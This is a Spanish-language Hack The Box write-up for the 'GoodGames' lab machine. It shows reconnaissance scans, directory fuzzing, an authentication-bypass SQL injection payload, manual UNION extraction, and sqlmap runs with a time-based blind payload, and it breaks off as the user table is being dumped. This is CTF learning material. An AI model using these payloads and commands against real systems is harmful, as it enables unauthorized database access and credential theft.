---
title: "GoodGames - Hack The Box"
date: 2024-10-14
draft: false
slug: "htb-writeup-goodgames"
excerpt: "Esta fue una máquina bastante útil para practicar inyecciones SQL basadas en errores. Empezamos únicamente encontrando un puerto abierto, siendo una página web activa que analizamos y probamos su registro de usuarios. Al no encontrar nada más, aplicamos una inyección SQL que nos permitió ganar acceso a la página como un administrador, lo que nos permitió también descubrir el login de Flask Volt. Pero, al no tener una contraseña, enumeramos la base de datos de la página web a través de inyecciones SQL basadas en errores, descubriendo un hash de la contraseña del administrador, crackeamos el hash y ganamos acceso al login de Flask Volt. Analizando las funciones de Flask Volt, encontramos que es vulnerable a Server Side Template Injection (SSTI) y de esta forma, aplicamos una Reverse Shell para ganar acceso a la máquina. Dentro de la máquina, identificamos que es un contenedor de Docker y que tiene una montura de un usuario, ahí aplicamos un script de Bash que descubre los puertos y encontramos activo el puerto 22, que es del servicio SSH, al que podemos entrar usando el nombre del usuario y la misma contraseña que usamos antes. Escalamos privilegios copiando el binario de Bash en el directorio home del usuario, ya que este es una montura, usamos el contenedor de Docker para cambiar los permisos de la Bash y al loguearnos otra vez al servicio SSH, usamos esa Bash modificada para convertirnos en Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Werkzeug", "Flask Volt", "Web Enumeration", "Fuzzing", "BurpSuite", "SQL Injection (Error Based)", "SQLi Automatization (SQLMAP)", "Cracking Hash", "Server Side Template Injection (SSTI)", "Docker Enumeration", "User Pivoting", "Password Reuse", "Abusing User Mount in Docker Container", "Privesc - Docker Breakout", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "BurpSuite"
  - "sqlmap"
  - "curl"
  - "echo"
  - "wc"
  - "hash-identifier"
  - "JohnTheRipper"
  - "tcpdump"
  - "nc"
  - "python3"
  - "hostname"
  - "id"
  - "ifconfig"
  - "ssh"
  - "ip a"
  - "find"
  - "pwd"
  - "Bash"
  - "chown"
  - "chmod"
links:
  - "https://www.reddit.com/r/hackthebox/comments/zl7rig/cant_run_gobuster/"
  - "https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/"
  - "https://backtrackacademy.com/articulo/ataque-de-una-base-de-datos-con-sqlmap"
  - "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
  - "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2"
  - "https://catonmat.net/tcp-port-scanner-in-bash"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-goodgames/GoodGames.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.130
PING 10.10.11.130 (10.10.11.130) 56(84) bytes of data.
64 bytes from 10.10.11.130: icmp_seq=1 ttl=63 time=67.8 ms
64 bytes from 10.10.11.130: icmp_seq=2 ttl=63 time=67.8 ms
64 bytes from 10.10.11.130: icmp_seq=3 ttl=63 time=68.3 ms
64 bytes from 10.10.11.130: icmp_seq=4 ttl=63 time=68.1 ms

--- 10.10.11.130 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 67.771/68.001/68.271/0.213 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.130 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 12:42 CST
Initiating SYN Stealth Scan at 12:42
Scanning 10.10.11.130 [65535 ports]
Discovered open port 80/tcp on 10.10.11.130
Completed SYN Stealth Scan at 12:42, 27.57s elapsed (65535 total ports)
Nmap scan report for 10.10.11.130
Host is up, received user-set (0.083s latency).
Scanned at 2024-10-14 12:42:20 CST for 28s
Not shown: 49224 closed tcp ports (reset), 16310 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds
           Raw packets sent: 137121 (6.033MB) | Rcvd: 52326 (2.093MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Qué extraño, solo nos dio un puerto abierto y es el puerto 80.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80 10.10.11.130 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 12:43 CST
Nmap scan report for 10.10.11.130
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51

|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que nos enfrentamos otra vez a **Werkzeug y Flask**. Vayamos a ver esa página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura1.png">
</p>

Se ve chula la página.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura2.png">
</p>

Parece que están ocupando muchas tecnologías.

Probemos si sale algo extra con **whatweb**:
```bash
whatweb http://10.10.11.130
http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```
Me da curiosidad eso del **PasswordField**. 

Por lo mientras, vamos a ver con que nos encontramos en la página web.

Si le damos al botón **Blog**, nos mostrará varias publicaciones y veremos algunos usuarios:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura3.png">
</p>

También podemos visitar los productos, pero solo sale lo siguiente:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura4.png">
</p>

Investigando por ahí, podemos ver un blog que sí podemos visitar:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura5.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura6.png">
</p>

Resulta que es una publicación del administrador, entonces, aquí está registrado un administrador. Lo tendremos en cuenta para más adelante.

Existe un login en el que nos podemos autenticar y registrar:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura7.png">
</p>

Vamos a intentar registrarnos con un usuario random:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura8.png">
</p>

Obtuvimos un registro exitoso.

Ahora nos autenticamos:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura10.png">
</p>

Bien, pudimos entrar.

Veamos si hay algo por ahí que solo un usuario puede ver:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura11.png">
</p>

Nada, solamente podemos ver la información de nuestro usuario.

Veamos si no hay algo que se nos esté escapando, aplicando **Fuzzing**.

### Fuzzing {#fuzz}

```bash
wfuzz -c -L --hc=404 -t 200 --hh 9265 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.130/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.130/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000072:   200        266 L    545 W      9267 Ch     "profile"                                                                                                                                       
000000039:   200        266 L    553 W      9294 Ch     "login"                                                                                                                                         
000000018:   200        908 L    2572 W     44206 Ch    "blog"                                                                                                                                          
000000203:   200        727 L    2070 W     33387 Ch    "signup"                                                                                                                                        
000001211:   200        1734 L   5548 W     85093 Ch    "logout"                                                                                                                                        
000012936:   200        729 L    2069 W     32744 Ch    "forgot-password"                                                                                                                               
000044928:   200        286 L    620 W      10524 Ch    "coming-soon"                                                                                                                                   
000045226:   200        1734 L   5548 W     85093 Ch    "http://10.10.11.130/"                                                                                                                          

Total time: 0
Processed Requests: 88573
Filtered Requests: 88565
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *-L*	     | Para que siga las redirecciones del HTTP que encuentre. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *--hh*     | Para no mostrar resultados que tenga N cantidad de caracteres. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.11.130/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 --exclude-length=9265 -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.130/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          9265
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 200) [Size: 44212]
/login                (Status: 200) [Size: 9294]
/profile              (Status: 200) [Size: 9267]
/signup               (Status: 200) [Size: 33387]
/logout               (Status: 200) [Size: 85107]
/forgot-password      (Status: 200) [Size: 32744]
/coming-soon          (Status: 200) [Size: 10524]
/server-status        (Status: 403) [Size: 277]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *--exclude-length=* | Para excluir resultados con N cantidad de caracteres. |
| *-r*       | Para que siga las redirecciones que encuentre. |

Pues no encontramos algo útil que nos ayude.

### Probando Inyección SQL en Login de Página Web con BurpSuite {#SQL1}

Algo que podemos hacer, es aplicar una **inyección SQL** en el login:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura12.png">
</p>

Pero obtenemos este problema.

Quizá se esté aplicando una expresión que evite las **SQLi**:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura13.png">
</p>

Parece que no.

Aplicaremos la inyección con **BurpSuite**.

Captura la petición del login con **BurpSuite**:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura22.png">
</p>

Envíala al **Repeater** y lanza la petición:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura14.png">
</p>

Observa cómo obtenemos un error.

Intentemos aplicar una **SQLi** común en el campo del **email**:
```sql
' or 1=1-- -
```

Envía la petición:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura15.png">
</p>

Excelente, parece que la **SQLi** funcionó, ya que se obtuvo una cookie de sesión y aparece el mensaje de un login exitoso.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Inyección SQL a Login y Ganando Acceso a la Página como Administrador {#SQL2}

Ya vimos que se puede aplicar una **inyección SQL** al login.

Vamos a capturarlo de nuevo y modificaremos el campo del email, para meter nuestra **SQLi**:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura16.png">
</p>

Dale a **Forward** para que envíe la petición con nuestra **SQLi**.

Observa el resultado que obtenemos:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura17.png">
</p>

Ganamos acceso como administrador, qué raro.

El perfil nos dice la información del administrador:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura18.png">
</p>

Parece que la extensión del correo es **goodgames.htb**.

Curiosamente, apareció un botón de configuración:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura19.png">
</p>

Entremos para ver de que se trata:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura20.png">
</p>

Parece que no nos está resolviendo la página.

Esto nos indica que se está aplicando **virtual hosting**.

Vamos a agregar esa ruta que no nos resuelve y **goodgames.htb** que es la extensión de correo que vimos al `/etc/hosts`:
```bash
nano /etc/hosts
10.10.11.130 internal-administration.goodgames.htb goodgames.htb
```

Listo, vuelve a cargar la página y veamos si ahora sí resuelve:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura21.png">
</p>

Muy bien, parece que llegamos al login de **Flask Volt**.

El problema es que no tenemos una credencial válida, pero como ya sabemos que podemos aplicar **inyecciones SQL**, podemos intentar revisar, analizar y dumpear la base de datos de la máquina, pues puede que ahí esté una contraseña que podamos ocupar.

### Aplicando Inyecciones SQL para Dumpear Base de Datos Manualmente con BurpSuite {#SQL3}

Lo principal que podemos hacer, es ver cuántas columnas tiene la BD.

Podemos hacerlo con `order by #` e ir jugando con la cantidad de columnas. Recuerda que si obtenemos una cookie, quiere decir que la inyección fue exitosa. Caso contrario, no funciona:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura23.png">
</p>

Obtuvimos un error, entonces no son 10. Probemos con menos:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura24.png">
</p>

Bien, son 4 columnas.

Podemos unir los datos de las 4 columnas con `union`:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura25.png">
</p>

Si analizamos la respuesta, vamos a encontrar que la última columna se representa en la respuesta, pues ahí se ve el 4:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura26.png">
</p>

Esto puede indicar que, cualquier cosa que pongamos ahí, se va a representar en la respuesta.

Probémoslo poniendo algo random:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura27.png">
</p>

Muy bien, con esto tenemos un vector de ataque que podemos usar.

Por ejemplo, probemos si aparece el nombre de la base de datos actual con `database()`:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura28.png">
</p>

El nombre es **main**.

De esta forma, podemos empezar a enumerar la base de datos actual e ir dumpeando su contenido.

Veamos si hay más bases de datos:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura29.png">
</p>

Parece que no, pero es confuso leer la respuesta así. 

Usaremos `concat()` para agregar una separación, usando los `:`:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura30.png">
</p>

Se ve y se entiende mejor.

Veamos las tablas existentes:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura31.png">
</p>

Son demasiadas, pero lo curioso son las últimas que aparecen, pues se ve una tabla llamada **user**.

Ahora, en vez de ver todas las tablas, vamos a ver solo las de la base de datos actual:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura32.png">
</p>

Solo hay 3 tablas y ahí está la de **user**.

Tratemos de ver su contenido:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura33.png">
</p>

Aparecen 4 columnas que tienen datos de nuestro interés.

Veamos el contenido de esas columnas:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura34.png">
</p>

Excelente, tenemos la contraseña del usuario administrador, pero parece estar encriptada.

También podemos obtener estos datos con `group_concat()`:

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/Captura35.png">
</p>

Bien, ahora solo probar si podemos descifrar la contraseña.

### Utilizando SQLMAP para Dumpear Base de Datos {#SQL4}

Ya lo hicimos de forma manual, ahora hagámoslo de forma automatizada.

Para esto, vamos a usar la herramienta **sqlmap**.

Antes de usarla, necesitaremos guardar la captura que hicimos de la petición del login.

Guárdala en un archivo:
```bash
nano loginRequest.txt
POST /login HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://10.10.11.130
Connection: keep-alive
Referer: http://10.10.11.130/
Upgrade-Insecure-Requests: 1

email=test1@test.com&password=test123
```

Usaremos este archivo para que pueda trabajar **sqlmap**.

Primero, probemos si **sqlmap** puede usar el archivo para encontrar una forma de aplicar las inyecciones.

Debemos indicarle que use nuestro archivo (`-r`) y le decimos que use el comportamiento por defecto, para que no nos pregunte nada (`--batch`):
```bash
sqlmap -r loginRequest.txt --batch
        ___
       __H__                                                                                                                                                                                                     
 ___ ___[,]_____ ___ ___  {1.8.9#stable}                                                                                                                                                                         

|_ -| . ["]     | .'| . |                                                                                                                                                                                        
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:56:42 /2024-10-14/

[18:56:42] [INFO] parsing HTTP request from 'loginRequest.txt'
[18:56:43] [INFO] testing connection to the target URL
[18:56:43] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:56:43] [INFO] testing if the target URL content is stable
[18:56:44] [INFO] target URL content is stable
[18:56:44] [INFO] testing if POST parameter 'email' is dynamic
[18:56:44] [WARNING] POST parameter 'email' does not appear to be dynamic
[18:56:44] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[18:56:45] [INFO] testing for SQL injection on POST parameter 'email'
[18:56:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:56:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:56:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:56:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:56:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:56:48] [INFO] testing 'Generic inline queries'
[18:56:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:56:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:56:49] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:56:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:57:00] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:57:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:57:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:57:00] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:57:00] [INFO] target URL appears to have 4 columns in query
got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] Y
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:57:06] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[18:57:08] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:57:14] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 148 HTTP(s) requests:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test1@test.com' AND (SELECT 2081 FROM (SELECT(SLEEP(5)))LEKh) AND 'Jmin'='Jmin&password=test123
---
[18:57:29] [INFO] the back-end DBMS is MySQL
[18:57:29] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12
[18:57:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.11.130'

[*] ending @ 18:57:30 /2024-10-14/
```
Encontró que el campo **email** es vulnerable a las **inyecciones SQL**.

Vamos a enumerar las bases de datos, para ver cuáles encuentra (`--dbs`):
```bash
sqlmap -r loginRequest.txt --batch --dbs
        ___
       __H__                                                                                                                                                                                                     
 ___ ___["]_____ ___ ___  {1.8.9#stable}                                                                                                                                                                         

|_ -| . [)]     | .'| . |                                                                                                                                                                                        
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:59:00 /2024-10-14/

[18:59:00] [INFO] parsing HTTP request from 'loginRequest.txt'
[18:59:00] [INFO] resuming back-end DBMS 'mysql' 
[18:59:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test1@test.com' AND (SELECT 2081 FROM (SELECT(SLEEP(5)))LEKh) AND 'Jmin'='Jmin&password=test123
---
[18:59:01] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[18:59:01] [INFO] fetching database names
[18:59:01] [INFO] fetching number of databases
[18:59:01] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                  
[18:59:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[18:59:16] [INFO] retrieved: 
[18:59:21] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[19:00:30] [INFO] retrieved: main
available databases [2]:
[*] information_schema
[*] main

[19:00:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.11.130'

[*] ending @ 19:00:44 /2024-10-14/
```
Ahí están las dos bases de datos, pero la que nos importa es la **BD main**.

Veamos si puede obtener las tablas de la **BD main**, indicándole la BD (`-D`) y que obtenga las tablas (`--tables`): 
```bash
sqlmap -r loginRequest.txt --batch --dbs -D main --tables
        ___
       __H__                                                                                                                                                                                                     
 ___ ___[.]_____ ___ ___  {1.8.9#stable}                                                                                                                                                                         

|_ -| . [']     | .'| . |                                                                                                                                                                                        
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:17:24 /2024-10-14/

[19:17:24] [INFO] parsing HTTP request from 'loginRequest.txt'
[19:17:24] [INFO] resuming back-end DBMS 'mysql' 
[19:17:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test1@test.com' AND (SELECT 2081 FROM (SELECT(SLEEP(5)))LEKh) AND 'Jmin'='Jmin&password=test123
---
[19:17:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[19:17:24] [INFO] fetching database names
[19:17:24] [INFO] fetching number of databases
[19:17:24] [INFO] resumed: 2
[19:17:24] [INFO] resumed: information_schema
[19:17:24] [INFO] resumed: main
available databases [2]:
[*] information_schema
[*] main

[19:17:24] [INFO] fetching tables for database: 'main'
[19:17:24] [INFO] fetching number of tables for database 'main'
[19:17:24] [INFO] resumed: 3
[19:17:24] [INFO] resumed: blog
[19:17:24] [INFO] resumed: blog_comments
[19:17:24] [INFO] resumed: user
Database: main
[3 tables]
+---------------+

| user          |
| blog          |
| blog_comments |
+---------------+

[19:17:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.11.130'

[*] ending @ 19:17:24 /2024-10-14/
```
Ahí están las tablas, pero solo nos interesa la tabla **user**.

Probemos si puede obtener las columnas de la tabla **user**, indicándole la tabla (`-T`) y que obtenga las columnas (`--columns`):
```bash
sqlmap -r loginRequest.txt --batch --dbs -D main -T user --columns
        ___
       __H__                                                                                                                                                                                                     
 ___ ___[(]_____ ___ ___  {1.8.9#stable}                                                                                                                                                                         

|_ -| . [.]     | .'| . |                                                                                                                                                                                        
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:17:57 /2024-10-14/

[19:17:57] [INFO] parsing HTTP request from 'loginRequest.txt'
[19:17:58] [INFO] resuming back-end DBMS 'mysql' 
[19:17:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test1@test.com' AND (SELECT 2081 FROM (SELECT(SLEEP(5)))LEKh) AND 'Jmin'='Jmin&password=test123
---
[19:17:58] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[19:17:58] [INFO] fetching database names
[19:17:58] [INFO] fetching number of databases
[19:17:58] [INFO] resumed: 2
[19:17:58] [INFO] resumed: information_schema
[19:17:58] [INFO] resumed: main
available databases [2]:
[*] information_schema
[*] main

[19:17:58] [INFO] fetching columns for table 'user' in database 'main'
[19:17:58] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                  
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[19:18:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[19:18:09] [INFO] retrieved: 
[19:18:19] [INFO] adjusting time delay to 1 second due to good response times
email
[19:18:36] [INFO] retrieved: varc
[19:18:56] [ERROR] invalid character detected. retrying..
[19:18:56] [WARNING] increasing time delay to 2 seconds
har(255)
[19:19:55] [INFO] retrieved: i
[19:20:08] [ERROR] invalid character detected. retrying..
[19:20:08] [WARNING] increasing time delay to 3 seconds
d
[19:20:18] [INFO] retrieved: int
[19:20:55] [INFO] retrieved: name
[19:21:33] [INFO] retrieved: varchar(255)
[19:23:32] [INFO] retrieved: password
[19:25:04] [INFO] retrieved: varchar(255)
Database: main
Table: user
[4 columns]
+----------+--------------+

| Column   | Type         |
+----------+--------------+

| name     | varchar(255) |
| email    | varchar(255) |
| id       | int          |
| password | varchar(255) |
+----------+--------------+

[19:27:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.11.130'

[*] ending @ 19:27:12 /2024-10-14/
```
Excelente, si obtuvo las columnas.

Vamos a dumpear el contenido de esas columnas, agregando el parámetro `--dump`:
```bash
sqlmap -r loginRequest.txt --batch --dbs -D main -T user --dump
        ___
       __H__                                                                                                                                                                                                     
 ___ ___[,]_____ ___ ___  {1.8.9#stable}                                                                                                                                                                         

|_ -| . ["]     | .'| . |                                                                                                                                                                                        
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:28:40 /2024-10-14/

[19:28:40] [INFO] parsing HTTP request from 'loginRequest.txt'
[19:28:40] [INFO] resuming back-end DBMS 'mysql' 
[19:28:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test1@test.com' AND (SELECT 2081 FROM (SELECT(SLEEP(5)))LEKh) AND 'Jmin'='Jmin&password=test123
---
